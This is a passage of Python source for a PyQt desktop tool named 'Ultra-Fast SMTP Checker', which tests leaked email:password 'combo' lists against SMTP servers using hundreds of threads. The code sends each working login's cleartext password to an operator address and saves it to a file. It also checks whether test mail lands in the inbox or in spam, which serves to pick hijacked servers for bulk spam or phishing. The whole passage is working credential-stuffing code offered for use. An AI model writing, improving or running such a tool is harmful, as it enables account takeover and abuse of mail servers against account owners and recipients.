            sorted_ports = sorted(available_ports, key=lambda x: port_priority.index(x) if x in port_priority else 999)
            
            for port in sorted_ports:
                server = None
                try:
                    # Check connection pool first
                    server = self.connection_pool.get_connection(host, port)
                    
                    if not server:
                        # Create new connection with optimized settings
                        if port == 465:
                            server = smtplib.SMTP_SSL(host, port, timeout=3)
                        else:
                            server = smtplib.SMTP(host, port, timeout=3)
                            if port in [587, 25, 2525]:
                                try:
                                    if server.has_extn('STARTTLS'):
                                        server.starttls()
                                        server.ehlo()
                                except:
                                    pass
                    
                    if not hasattr(server, 'ehlo_resp') or not server.ehlo_resp:
                        server.ehlo()
                    
                    # Quick limit check
                    limit = self.get_smtp_limits_ultra_fast(server, host)
                    
                    # Fast authentication test
                    server.login(email, password)
                    
                    # Determine provider
                    provider = self._get_provider(domain)
                    
                    # Generate unique test subject
                    test_subject = f"SMTP Test {uuid.uuid4().hex[:8]}"
                    
                    # Send test email based on mode
                    if self.email_mode == "template" and self.template_data:
                        self._send_template_email(server, email, test_subject)
                    else:
                        self._send_credentials_email(server, email, password, host, port, limit, test_subject)
                    
                    # Check inbox/spam if enabled
                    delivery_status = "❓ Unknown"
                    if self.enable_inbox_check and self.inbox_checker and self.check_email and self.check_password:
                        try:
                            # Wait a moment for email to arrive
                            time.sleep(2)
                            check_result = self.inbox_checker.check_inbox_or_spam(
                                self.check_email, self.check_password, test_subject, timeout=10
                            )
                            
                            if check_result == 'inbox':
                                delivery_status = "📥 Inbox"
                                self.stats.update(inbox_delta=1)
                            elif check_result == 'spam':
                                delivery_status = "🗑️ Spam"
                                self.stats.update(spam_delta=1)
                            
                            self.signals.inbox_spam_result.emit(email, delivery_status)
                        except Exception as e:
                            self.signals.log.emit(f"[W{self.worker_id}] Inbox check failed for {email}: {str(e)}")
                    
                    # Return connection to pool
                    self.connection_pool.return_connection(host, port, server)
                    
                    # Cache successful configuration
                    result = (host, port, limit, provider, delivery_status)
                    self.successful_configs[config_key] = result
                    
                    return True, *result
                    
                except smtplib.SMTPAuthenticationError:
                    try:
                        if server:
                            server.quit()
                    except:
                        pass
                    break  # Invalid credentials
                    
                except Exception:
                    try:
                        if server:
                            server.quit()
                    except:
                        pass
                    continue
        
        return False, None, None, None, None, "❓ Unknown"
    
    def _get_provider(self, domain):
        """Extract provider from domain"""
        domain_lower = domain.lower()
        if 'gmail' in domain_lower:
            return 'Gmail'
        elif any(x in domain_lower for x in ['outlook', 'hotmail', 'live']):
            return 'Outlook'
        elif 'yahoo' in domain_lower:
            return 'Yahoo'
        elif 'icloud' in domain_lower:
            return 'iCloud'
        else:
            return 'Other'
    
    def _send_template_email(self, server, from_email, test_subject):
        """Send email using custom template"""
        try:
            msg = MIMEMultipart('alternative')
            msg['From'] = from_email
            msg['To'] = self.test_email
            msg['Subject'] = test_subject
            
            # Add plain text part
            if self.template_data.get("plain_text"):
                plain_part = MIMEText(self.template_data["plain_text"], 'plain')
                msg.attach(plain_part)
            
            # Add HTML part if enabled
            if self.template_data.get("use_html") and self.template_data.get("html"):
                html_part = MIMEText(self.template_data["html"], 'html')
                msg.attach(html_part)
            
            server.send_message(msg)
        except:
            pass  # Email sending is secondary to credential validation
    
    def _send_credentials_email(self, server, email, password, host, port, limit, test_subject):
        """Send email with SMTP credentials"""
        try:
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = self.test_email
            msg['Subject'] = test_subject
            
            body = f"""
✅ SMTP Server Test Successful!

🔧 SMTP Configuration:
• Host: {host}
• Port: {port}
• Email: {email}
• Password: {password}
• Limit: {limit}

📊 Server Capabilities:
This SMTP server is verified and ready for use.

⚡ Tested by Ultra-Fast SMTP Checker v3.0
            """
            
            msg.attach(MIMEText(body, 'plain'))
            server.send_message(msg)
        except:
            pass

    def run(self):
        """Optimized worker execution with batch processing and inbox detection"""
        processed = 0
        
        try:
            for combo in self.combo_generator:
                if not self.running:
                    break
                
                if ':' not in combo or '@' not in combo:
                    processed += 1
                    continue
                
                try:
                    email, password = combo.split(':', 1)
                    
                    # Lightning-fast SMTP test with inbox detection
                    success, host, port, limit, provider, delivery_status = self.lightning_smtp_test(email, password)
                    
                    if success:
                        # Determine limit type
                        limit_type = "unknown"
                        if any(x in limit.lower() for x in ["/hour", "/day", "/min"]):
                            limit_type = "rate"
                        elif any(x in limit.lower() for x in ["mb", "kb", "b"]):
                            limit_type = "size"
                        
                        # Update stats
                        self.stats.update(
                            processed_delta=1,
                            valid_delta=1,
                            port=port,
                            domain=email.split('@')[1],
                            limit_type=limit_type
                        )
                        
                        # Create display info with delivery status
                        smtp_info = f"{host}|{port}|{email}|{password}|{limit}|{provider}|{delivery_status}"
                        
                        # Emit signals
                        self.signals.valid_smtp.emit(
                            smtp_info, 
                            limit, 
                            {
                                'provider': provider,
                                'port': port,
                                'limit_type': limit_type,
                                'delivery_status': delivery_status
                            }
                        )
                        
                        delivery_icon = "📥" if "Inbox" in delivery_status else "🗑️" if "Spam" in delivery_status else "❓"
                        self.signals.log.emit(f"[W{self.worker_id}] ✅ {email} -> {host}:{port} ({limit}) {delivery_icon}")
                        
                        # Write to file asynchronously
                        file_info = f"{host}|{port}|{email}|{password}|{delivery_status}"
                        AsyncResultWriter().write_async(file_info)
                    else:
                        self.stats.update(processed_delta=1)
                        
                        # Log failed attempts occasionally
                        if processed % 200 == 0:
                            self.signals.log.emit(f"[W{self.worker_id}] ❌ Batch processed: {processed}")
                    
                    processed += 1
                    self.processed_batch += 1
                    
                    # Emit progress in batches
                    if self.processed_batch >= self.batch_size:
                        self.signals.progress.emit(self.processed_batch)
                        self.processed_batch = 0
                    
                    # Memory cleanup every 100 processed
                    if processed % 100 == 0:
                        gc.collect()
                        # Clear DNS cache of expired entries
                        self.dns_cache.cache.clear_expired()
                        
                except Exception as e:
                    self.signals.log.emit(f"[W{self.worker_id}] Error processing {combo}: {str(e)}")
                    processed += 1
                    continue
        
        except Exception as e:
            self.signals.log.emit(f"[W{self.worker_id}] Worker error: {str(e)}")
        
        # Emit remaining progress
        if self.processed_batch > 0:
            self.signals.progress.emit(self.processed_batch)
        
        self.signals.finished.emit()

    def stop(self):
        self.running = False

class EnhancedMainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("⚡ Ultra-Fast SMTP Checker v3.0 - Professional Edition with Inbox Detection")
        self.setMinimumSize(1400, 1000)
        
        # Initialize components
        self.checker = None
        self.template_data = None
        self.inbox_checker_enabled = False
        
        self.init_ui()
        self.apply_modern_theme()
        self.load_existing_valid()
        
    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Create status bar
        self.statusBar = QStatusBar()
        self.setStatusBar(self.statusBar)
        self.statusBar.showMessage("🔄 Ready for ultra-fast scanning with inbox detection")
        
        # Main layout with modern splitter
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(10)
        
        # Header section
        header_widget = self.create_header_section()
        main_layout.addWidget(header_widget)
        
        # Main content splitter
        main_splitter = QSplitter(Qt.Orientation.Horizontal)
        main_splitter.setHandleWidth(3)
        main_splitter.setStyleSheet("""
            QSplitter::handle {
                background: #bdc3c7;
                border-radius: 2px;
            }
            QSplitter::handle:hover {
                background: #95a5a6;
            }
        """)
        
        # Left panel (controls)
        left_panel = self.create_enhanced_left_panel()
        main_splitter.addWidget(left_panel)
        
        # Right panel (results and stats)
        right_panel = self.create_enhanced_right_panel()
        main_splitter.addWidget(right_panel)
        
        # Set splitter proportions
        main_splitter.setSizes([450, 950])
        
        main_layout.addWidget(main_splitter)
    
    def create_header_section(self):
        """Create modern header with branding"""
        header_frame = QFrame()
        header_frame.setFixedHeight(80)
        header_frame.setStyleSheet("""
            QFrame {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #667eea, stop:0.5 #764ba2, stop:1 #667eea);
                border-radius: 12px;
                border: none;
            }
        """)
        
        layout = QHBoxLayout(header_frame)
        layout.setContentsMargins(30, 20, 30, 20)
        
        # Title and version
        title_layout = QVBoxLayout()
        
        title = QLabel("⚡ Ultra-Fast SMTP Checker")
        title.setStyleSheet("""
            font-size: 24px; 
            font-weight: bold; 
            color: white;
            margin: 0;
        """)
        
        subtitle = QLabel("v3.0 Professional Edition • Inbox/Spam Detection • Real-time Analytics")
        subtitle.setStyleSheet("""
            font-size: 12px; 
            color: rgba(255, 255, 255, 0.8);
            margin: 0;
        """)
        
        title_layout.addWidget(title)
        title_layout.addWidget(subtitle)
        title_layout.addStretch()
        
        # Stats summary
        stats_layout = QVBoxLayout()
        
        self.header_valid_count = QLabel("0")
        self.header_valid_count.setStyleSheet("""
            font-size: 28px; 
            font-weight: bold; 
            color: white;
            margin: 0;
        """)
        self.header_valid_count.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        valid_label = QLabel("Valid SMTP Servers")
        valid_label.setStyleSheet("""
            font-size: 10px; 
            color: rgba(255, 255, 255, 0.8);
            margin: 0;
        """)
        valid_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        stats_layout.addWidget(self.header_valid_count)
        stats_layout.addWidget(valid_label)
        
        layout.addLayout(title_layout)
        layout.addStretch()
        layout.addLayout(stats_layout)
        
        return header_frame
    
    def create_enhanced_left_panel(self):
        """Create enhanced left control panel"""
        panel = QWidget()
        panel.setFixedWidth(430)
        layout = QVBoxLayout(panel)
        layout.setSpacing(15)
        
        # Configuration section
        config_section = self.create_config_section()
        layout.addWidget(config_section)
        
        # Inbox detection section
        inbox_section = self.create_inbox_detection_section()
        layout.addWidget(inbox_section)
        
        # Email mode section
        email_section = self.create_email_mode_section()
        layout.addWidget(email_section)
        
        # Control buttons section
        controls_section = self.create_controls_section()
        layout.addWidget(controls_section)
        
        # Progress section
        progress_section = self.create_progress_section()
        layout.addWidget(progress_section)
        
        # Log section
        log_section = self.create_log_section()
        layout.addWidget(log_section)
        
        layout.addStretch()
        return panel
    
    def create_config_section(self):
        """Create configuration section"""
        group = QGroupBox("⚙️ Configuration")
        group.setStyleSheet(self.get_group_style())
        layout = QVBoxLayout(group)
        
        # Test email
        test_email_layout = QHBoxLayout()
        test_email_layout.addWidget(QLabel("📧 Test Email:"))
        self.test_email_input = QLineEdit()
        self.test_email_input.setPlaceholderText("your_email@example.com")
        self.test_email_input.setStyleSheet(self.get_input_style())
        test_email_layout.addWidget(self.test_email_input)
        layout.addLayout(test_email_layout)
        
        # Thread count and file selection in same row
        settings_layout = QHBoxLayout()
        
        # Thread count
        thread_layout = QVBoxLayout()
        thread_layout.addWidget(QLabel("🧵 Max Threads:"))
        self.thread_input = QSpinBox()
        self.thread_input.setRange(1, 500)
        self.thread_input.setValue(200)
        self.thread_input.setSuffix(" workers")
        self.thread_input.setStyleSheet(self.get_input_style())
        thread_layout.addWidget(self.thread_input)
        
        settings_layout.addLayout(thread_layout)
        settings_layout.addSpacing(15)
        
        # File selection
        file_layout = QVBoxLayout()
        file_layout.addWidget(QLabel("📁 Combo File:"))
        file_select_layout = QHBoxLayout()
        self.file_path_input = QLineEdit()
        self.file_path_input.setReadOnly(True)
        self.file_path_input.setPlaceholderText("Select combo file (email:password)")
        self.file_path_input.setStyleSheet(self.get_input_style())
        browse_button = AnimatedButton("Browse", "#95a5a6")
        browse_button.clicked.connect(self.browse_file)
        file_select_layout.addWidget(self.file_path_input)
        file_select_layout.addWidget(browse_button)
        file_layout.addLayout(file_select_layout)
        
        settings_layout.addLayout(file_layout)
        layout.addLayout(settings_layout)
        
        return group
    
    def create_inbox_detection_section(self):
        """Create inbox/spam detection section"""
        group = QGroupBox("📥 Inbox/Spam Detection (Optional)")
        group.setStyleSheet(self.get_group_style())
        layout = QVBoxLayout(group)
        
        # Enable checkbox
        self.enable_inbox_check = QCheckBox("🔍 Enable Inbox/Spam Detection")
        self.enable_inbox_check.setStyleSheet("""
            QCheckBox {
                font-weight: bold;
                color: #2c3e50;
            }
            QCheckBox::indicator:checked {
                background: #27ae60;
                border: 2px solid #2ecc71;
            }
        """)
        self.enable_inbox_check.toggled.connect(self.toggle_inbox_detection)
        layout.addWidget(self.enable_inbox_check)
        
        # Check email input
        check_email_layout = QHBoxLayout()
        check_email_layout.addWidget(QLabel("📮 Check Email:"))
        self.check_email_input = QLineEdit()
        self.check_email_input.setPlaceholderText("email:password format for IMAP checking")
        self.check_email_input.setStyleSheet(self.get_input_style())
        self.check_email_input.setEnabled(False)
        check_email_layout.addWidget(self.check_email_input)
        layout.addLayout(check_email_layout)
        
        # Info label
        info_label = QLabel("💡 This will check if sent emails land in inbox (green) or spam (orange)")
        info_label.setStyleSheet("""
            font-size: 10px;
            color: #7f8c8d;
            font-style: italic;
            padding: 5px;
            background: #ecf0f1;
            border-radius: 4px;
        """)
        info_label.setWordWrap(True)
        layout.addWidget(info_label)
        
        return group
    
    def create_email_mode_section(self):
        """Create email mode section"""
        group = QGroupBox("📧 Email Mode")
        group.setStyleSheet(self.get_group_style())
        layout = QVBoxLayout(group)
        
        self.email_mode_group = QButtonGroup()
        self.credentials_radio = QRadioButton("🔑 Send SMTP Credentials")
        self.template_radio = QRadioButton("✉️ Use Custom Template")
        self.credentials_radio.setChecked(True)
        
        self.email_mode_group.addButton(self.credentials_radio)
        self.email_mode_group.addButton(self.template_radio)
        
        layout.addWidget(self.credentials_radio)
        layout.addWidget(self.template_radio)
        
        # Template button
        self.template_button = AnimatedButton("📝 Create/Edit Template", "#9b59b6")
        self.template_button.clicked.connect(self.open_template_editor)
        layout.addWidget(self.template_button)
        
        return group
    
    def create_controls_section(self):
        """Create control buttons section"""
        group = QGroupBox("🎮 Controls")
        group.setStyleSheet(self.get_group_style())
        layout = QVBoxLayout(group)
        
        self.start_button = AnimatedButton("🚀 Start Ultra-Fast Scan", "#27ae60")
        self.start_button.clicked.connect(self.start_checking)
        self.start_button.setFixedHeight(50)
        self.start_button.setStyleSheet(self.start_button.get_base_style() + "font-size: 14px;")
        
        self.stop_button = AnimatedButton("⏹ Emergency Stop", "#e74c3c")
        self.stop_button.clicked.connect(self.stop_checking)
        self.stop_button.setEnabled(False)
        self.stop_button.setFixedHeight(50)
        self.stop_button.setStyleSheet(self.stop_button.get_base_style() + "font-size: 14px;")
        
        layout.addWidget(self.start_button)
        layout.addWidget(self.stop_button)
        
        return group
    
    def create_progress_section(self):
        """Create progress section"""
        group = QGroupBox("📊 Progress")
        group.setStyleSheet(self.get_group_style())
        layout = QVBoxLayout(group)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 2px solid #bdc3c7;
                border-radius: 8px;
                text-align: center;
                background: white;
                font-weight: bold;
                height: 25px;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #3498db, stop:1 #2980b9);
                border-radius: 6px;
            }
        """)
        layout.addWidget(self.progress_bar)
        
        self.status_label = QLabel("🔄 Ready for ultra-fast scanning with inbox detection")
        self.status_label.setStyleSheet("""
            font-weight: bold; 
            color: #2c3e50; 
            padding: 8px;
            background: #ecf0f1;
            border-radius: 4px;
            font-size: 11px;
        """)
        self.status_label.setWordWrap(True)
        layout.addWidget(self.status_label)
        
        return group
    
    def create_log_section(self):
        """Create log section"""
        group = QGroupBox("📋 System Log")
        group.setStyleSheet(self.get_group_style())
        layout = QVBoxLayout(group)
        
        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)
        self.log_display.setMaximumHeight(180)
        self.log_display.setStyleSheet("""
            QTextEdit {
                background: #2c3e50; 
                color: #ecf0f1; 
                font-family: 'Consolas', 'Monaco', monospace;
                font-size: 10px;
                border: none;
                border-radius: 6px;
                padding: 8px;
            }
        """)
        layout.addWidget(self.log_display)
        
        return group
    
    def create_enhanced_right_panel(self):
        """Create enhanced right results panel"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(15)
        
        # Enhanced stats dashboard
        stats_section = self.create_enhanced_stats_section()
        layout.addWidget(stats_section)
        
        # Results section
        results_section = self.create_enhanced_results_section()
        layout.addWidget(results_section)
        
        return panel
    
    def create_enhanced_stats_section(self):
        """Create enhanced statistics dashboard"""
        group = QGroupBox("📈 Real-time Analytics Dashboard")
        group.setStyleSheet(self.get_group_style())
        layout = QVBoxLayout(group)
        
        # Stats grid
        stats_grid = QGridLayout()
        stats_grid.setSpacing(15)
        
        # Create modern stat cards
        self.stat_cards = {}
        
        # Row 1: Main stats
        self.stat_cards['processed'] = ModernStatsCard("Processed", "0", "📊", "#3498db")
        self.stat_cards['valid'] = ModernStatsCard("Valid Found", "0", "✅", "#27ae60")
        self.stat_cards['success_rate'] = ModernStatsCard("Success Rate", "0%", "📈", "#9b59b6")
        self.stat_cards['speed'] = ModernStatsCard("Speed", "0/s", "⚡", "#f39c12")
        
        stats_grid.addWidget(self.stat_cards['processed'], 0, 0)
        stats_grid.addWidget(self.stat_cards['valid'], 0, 1)
        stats_grid.addWidget(self.stat_cards['success_rate'], 0, 2)
        stats_grid.addWidget(self.stat_cards['speed'], 0, 3)
        
        # Row 2: Delivery stats
        self.stat_cards['inbox'] = ModernStatsCard("Inbox Delivery", "0", "📥", "#2ecc71")
        self.stat_cards['spam'] = ModernStatsCard("Spam Delivery", "0", "🗑️", "#e67e22")
        self.stat_cards['rate_limits'] = ModernStatsCard("Rate Limits", "0", "⚡", "#1abc9c")
        self.stat_cards['elapsed'] = ModernStatsCard("Elapsed", "0s", "⏱️", "#34495e")
        
        stats_grid.addWidget(self.stat_cards['inbox'], 1, 0)
        stats_grid.addWidget(self.stat_cards['spam'], 1, 1)
        stats_grid.addWidget(self.stat_cards['rate_limits'], 1, 2)
        stats_grid.addWidget(self.stat_cards['elapsed'], 1, 3)
        
        layout.addLayout(stats_grid)
        
        # Additional info row
        info_layout = QHBoxLayout()
        
        self.top_ports_label = QLabel("🔌 Top Ports: None")
        self.top_ports_label.setStyleSheet("font-size: 11px; color: #7f8c8d; padding: 5px;")
        
        self.top_providers_label = QLabel("📧 Top Providers: None")
        self.top_providers_label.setStyleSheet("font-size: 11px; color: #7f8c8d; padding: 5px;")
        
        info_layout.addWidget(self.top_ports_label)
        info_layout.addWidget(self.top_providers_label)
        
        layout.addLayout(info_layout)
        
        return group
    
    def create_enhanced_results_section(self):
        """Create enhanced results section"""
        group = QGroupBox("✅ Valid SMTP Servers with Delivery Status")
        group.setStyleSheet(self.get_group_style())
        layout = QVBoxLayout(group)
        
        # Filter widget will be created after table
        self.filter_widget = None
        
        # Enhanced help text
        help_layout = QHBoxLayout()
        sort_help = QLabel("💡 Click column headers for advanced sorting • Right-click rows for options")
        sort_help.setStyleSheet("font-size: 10px; color: #7f8c8d; font-style: italic;")
        
        delivery_help = QLabel("🎨 Green=Inbox, Orange=Spam, Gray=Unknown")
        delivery_help.setStyleSheet("font-size: 10px; color: #7f8c8d; font-style: italic;")
        
        help_layout.addWidget(sort_help)
        help_layout.addStretch()
        help_layout.addWidget(delivery_help)
        layout.addLayout(help_layout)
        
        # Enhanced table with delivery status column
        self.valid_table = EnhancedSortableTableWidget(0, 9)  # Added Delivery column
        self.valid_table.setHorizontalHeaderLabels([
            "Host", "Port", "Email", "Password", "Limit", "Type", "Provider", "Delivery", "Actions"
        ])
        
        # Set column widths
        header = self.valid_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)  # Host
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)  # Port
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)           # Email
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)  # Password
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.ResizeToContents)  # Limit
        header.setSectionResizeMode(5, QHeaderView.ResizeMode.ResizeToContents)  # Type
        header.setSectionResizeMode(6, QHeaderView.ResizeMode.ResizeToContents)  # Provider
        header.setSectionResizeMode(7, QHeaderView.ResizeMode.ResizeToContents)  # Delivery
        header.setSectionResizeMode(8, QHeaderView.ResizeMode.ResizeToContents)  # Actions
        
        # Add context menu to table
        self.valid_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.valid_table.customContextMenuRequested.connect(self.show_enhanced_context_menu)
        
        layout.addWidget(self.valid_table)
        
        return group

    def apply_modern_theme(self):
        """Apply modern theme to the application"""
        self.setStyleSheet("""
            QMainWindow {
                background: #f8f9fa;
                color: #2c3e50;
            }
            QWidget {
                background: transparent;
            }
        """)
    
    def get_group_style(self):
        """Get consistent group box styling"""
        return """
            QGroupBox {
                font-weight: bold;
                color: #2c3e50;
                border: 2px solid #e9ecef;
                border-radius: 10px;
                margin: 8px 0;
                padding: 15px 10px 10px 10px;
                background: white;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 15px;
                padding: 0 8px 0 8px;
                color: #495057;
                background: white;
            }
        """
    
    def get_input_style(self):
        """Get consistent input styling"""
        return """
            QLineEdit, QSpinBox, QComboBox {
                border: 2px solid #dee2e6;
                border-radius: 6px;
                padding: 8px 12px;
                background: white;
                font-size: 11px;
            }
            QLineEdit:focus, QSpinBox:focus, QComboBox:focus {
                border-color: #3498db;
                box-shadow: 0 0 5px rgba(52, 152, 219, 0.3);
            }
        """
    
    def toggle_inbox_detection(self, checked):
        """Toggle inbox/spam detection feature"""
        self.inbox_checker_enabled = checked
        self.check_email_input.setEnabled(checked)
        
        if checked:
            self.log("📥 Inbox/Spam detection enabled - Configure your check email")
        else:
            self.log("📥 Inbox/Spam detection disabled")
    
    def browse_file(self):
        """Browse for combo file"""
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Combo File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.file_path_input.setText(file_path)
            # Show file info
            try:
                file_size = os.path.getsize(file_path) / 1024 / 1024
                self.log(f"📁 Selected file: {file_size:.1f}MB")
            except:
                pass
    
    def open_template_editor(self):
        """Open template editor (simplified for this demo)"""
        self.log("📝 Template editor feature available in full version")
        # Template editor would go here
    
    def show_enhanced_context_menu(self, position):
        """Show enhanced context menu for table"""
        item = self.valid_table.itemAt(position)
        if item is None:
            return
        
        row = item.row()
        menu = QMenu(self)
        
        # Enhanced copy actions
        copy_row_action = menu.addAction("📋 Copy Full Row")
        copy_email_action = menu.addAction("📧 Copy Email Only")
        copy_smtp_action = menu.addAction("🔧 Copy SMTP Config")
        copy_delivery_action = menu.addAction("📥 Copy Delivery Status")
        
        menu.addSeparator()
        
        # Test actions
        test_smtp_action = menu.addAction("🧪 Test This SMTP")
        recheck_delivery_action = menu.addAction("🔄 Recheck Delivery")
        
        menu.addSeparator()
        
        # Export actions
        export_row_action = menu.addAction("💾 Export This Row")
        export_all_action = menu.addAction("📊 Export All Results")
        
        action = menu.exec(self.valid_table.mapToGlobal(position))
        
        if action == copy_row_action:
            self.copy_table_row(row)
        elif action == copy_email_action:
            self.copy_table_cell(row, 2)  # Email column
        elif action == copy_smtp_action:
            self.copy_smtp_config(row)
        elif action == copy_delivery_action:
            self.copy_table_cell(row, 7)  # Delivery column
        elif action == test_smtp_action:
            self.test_individual_smtp(row)
        elif action == recheck_delivery_action:
            self.recheck_delivery_status(row)
        elif action == export_row_action:
            self.export_table_row(row)
        elif action == export_all_action:
            self.export_all_results()
    
    def copy_table_row(self, row):
        """Copy entire table row to clipboard"""
        row_data = []
        for col in range(self.valid_table.columnCount() - 1):  # Exclude Actions column
            item = self.valid_table.item(row, col)
            row_data.append(item.text() if item else "")
        
        QApplication.clipboard().setText(" | ".join(row_data))
        self.log("📋 Row copied to clipboard")
    
    def copy_table_cell(self, row, col):
        """Copy specific table cell to clipboard"""
        item = self.valid_table.item(row, col)
        if item:
            QApplication.clipboard().setText(item.text())
            column_name = self.valid_table.horizontalHeaderItem(col).text()
            self.log(f"📋 {column_name} copied to clipboard")
    
    def copy_smtp_config(self, row):
        """Copy SMTP configuration to clipboard"""
        host = self.valid_table.item(row, 0).text()
        port = self.valid_table.item(row, 1).text()
        email = self.valid_table.item(row, 2).text()
        password = self.valid_table.item(row, 3).text()
        
        config = f"Host: {host}\nPort: {port}\nEmail: {email}\nPassword: {password}"
        QApplication.clipboard().setText(config)
        self.log("🔧 SMTP configuration copied to clipboard")
    
    def test_individual_smtp(self, row):
        """Test individual SMTP configuration"""
        email = self.valid_table.item(row, 2).text()
        self.log(f"🧪 Testing SMTP for {email} (feature in development)")
    
    def recheck_delivery_status(self, row):
        """Recheck delivery status for specific email"""
        email = self.valid_table.item(row, 2).text()
        self.log(f"🔄 Rechecking delivery status for {email} (feature in development)")
    
    def export_table_row(self, row):
        """Export table row to file"""
        row_data = []
        for col in range(self.valid_table.columnCount() - 1):  # Exclude Actions column
            item = self.valid_table.item(row, col)
            row_data.append(item.text() if item else "")
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Export Row", "", "Text Files (*.txt);;CSV Files (*.csv);;All Files (*)"
        )
        
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    if file_path.endswith('.csv'):
                        f.write(",".join([f'"{cell}"' for cell in row_data]))
                    else:
                        f.write(" | ".join(row_data))
                self.log(f"💾 Row exported to {file_path}")
            except Exception as e:
                QMessageBox.warning(self, "Export Error", f"Failed to export: {str(e)}")
    
    def export_all_results(self):
        """Export all results to file"""
        if self.valid_table.rowCount() == 0:
            QMessageBox.information(self, "No Data", "No results to export")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Export All Results", "", 
            "CSV Files (*.csv);;Text Files (*.txt);;JSON Files (*.json);;All Files (*)"
        )
        
        if file_path:
            try:
                results = []
                headers = [self.valid_table.horizontalHeaderItem(i).text() 
                          for i in range(self.valid_table.columnCount() - 1)]  # Exclude Actions
                
                for row in range(self.valid_table.rowCount()):
                    row_data = []
                    for col in range(self.valid_table.columnCount() - 1):
                        item = self.valid_table.item(row, col)
                        row_data.append(item.text() if item else "")
                    results.append(row_data)
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    if file_path.endswith('.csv'):
                        f.write(",".join([f'"{h}"' for h in headers]) + "\n")
                        for row_data in results:
                            f.write(",".join([f'"{cell}"' for cell in row_data]) + "\n")
                    elif file_path.endswith('.json'):
                        json_data = []
                        for row_data in results:
                            json_data.append(dict(zip(headers, row_data)))
                        json.dump(json_data, f, indent=2, ensure_ascii=False)
                    else:
                        f.write(" | ".join(headers) + "\n")
                        for row_data in results:
                            f.write(" | ".join(row_data) + "\n")
                
                self.log(f"📊 All results exported to {file_path}")
                QMessageBox.information(self, "Export Complete", 
                    f"Successfully exported {len(results)} results to {file_path}")
            except Exception as e:
                QMessageBox.warning(self, "Export Error", f"Failed to export: {str(e)}")
    
    def start_checking(self):
        """Start the enhanced SMTP checking process"""
        # Validation
        test_email = self.test_email_input.text().strip()
        if not test_email or '@' not in test_email:
            QMessageBox.warning(self, "Invalid Email", "Please enter a valid test email address")
            return
        
        file_path = self.file_path_input.text()
        if not file_path or not os.path.exists(file_path):
            QMessageBox.warning(self, "File Not Found", "Please select a valid combo file")
            return
        
        # Check inbox detection settings
        check_email = None
        check_password = None
        if self.inbox_checker_enabled:
            check_input = self.check_email_input.text().strip()
            if not check_input or ':' not in check_input:
                reply = QMessageBox.question(
                    self, "Inbox Detection", 
                    "Inbox detection is enabled but no check email configured.\nContinue without inbox detection?",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
                )
                if reply == QMessageBox.StandardButton.No:
                    return
                self.inbox_checker_enabled = False
            else:
                try:
                    check_email, check_password = check_input.split(':', 1)
                except:
                    QMessageBox.warning(self, "Invalid Format", "Check email must be in email:password format")
                    return
        
        max_threads = self.thread_input.value()
        
        # Determine email mode
        email_mode = "template" if self.template_radio.isChecked() else "credentials"
        template_data = self.template_data if email_mode == "template" else None
        
        # Update UI
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setValue(0)
        self.status_label.setText("🔄 Initializing ultra-fast scanner with inbox detection...")
        self.statusBar.showMessage("🚀 Scanning in progress...")
        
        # Clear previous results if desired
        reply = QMessageBox.question(
            self, "Clear Results", 
            "Clear previous results before starting?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            self.valid_table.setRowCount(0)
            # Reset stats
            for card in self.stat_cards.values():
                card.update_value("0")
            self.header_valid_count.setText("0")
        
        # Initialize enhanced checker with inbox detection
        self.checker = self.create_enhanced_checker(
            test_email, max_threads, email_mode, template_data,
            check_email, check_password, self.inbox_checker_enabled
        )
        
        # Connect signals
        self.checker.signals.log.connect(self.log)
        self.checker.signals.progress.connect(self.update_progress)
        self.checker.signals.valid_smtp.connect(self.add_enhanced_valid_smtp)
        self.checker.signals.finished.connect(self.checking_finished)
        self.checker.signals.stats_update.connect(self.update_enhanced_stats)
        
        try:
            # Load and start checking
            self.log("📂 Loading combo file with advanced optimizations...")
            combo_generator = self.checker.load_combos(file_path)
            
            combos = list(combo_generator)
            self.checker.total_combos = self.checker.file_handler.valid_combos
            
            self.log(f"🎯 Target: {self.checker.total_combos} valid combos")
            self.log(f"⚡ Mode: {email_mode.title()}")
            self.log(f"🧵 Threads: {max_threads}")
            if self.inbox_checker_enabled:
                self.log(f"📥 Inbox detection: Enabled")
            
            # Start checking
            self.checker.start(combos)
            
        except Exception as e:
            self.log(f"❌ Error starting checker: {str(e)}")
            self.checking_finished()
    
    def stop_checking(self):
        """Stop the checking process"""
        if self.checker:
            self.log("🛑 Initiating emergency stop...")
            self.stop_button.setEnabled(False)
            self.stop_button.setText("⏹ Stopping...")
            
            try:
                self.checker.stop()
            except Exception as e:
                self.log(f"❌ Error during stop: {str(e)}")
            
            self.checking_finished()
    
